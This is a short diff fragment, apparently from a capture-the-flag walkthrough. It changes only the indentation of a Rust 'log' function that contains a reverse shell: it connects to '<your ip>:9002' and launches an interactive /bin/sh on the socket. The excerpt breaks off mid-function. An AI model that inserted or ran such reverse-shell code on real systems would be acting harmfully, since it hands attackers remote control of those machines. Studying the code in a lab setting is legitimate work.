@@ -168,7 +168,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
         use std::process::{Command, Stdio};
 
         pub fn log(user: &str, query: &str, justification: &str) {
-                let s = TcpStream::connect("<your ip>:9002").unwrap();
+            let s = TcpStream::connect("<your ip>:9002").unwrap();
             let fd = s.as_raw_fd();
             Command::new("/bin/sh")
                 .arg("-i")
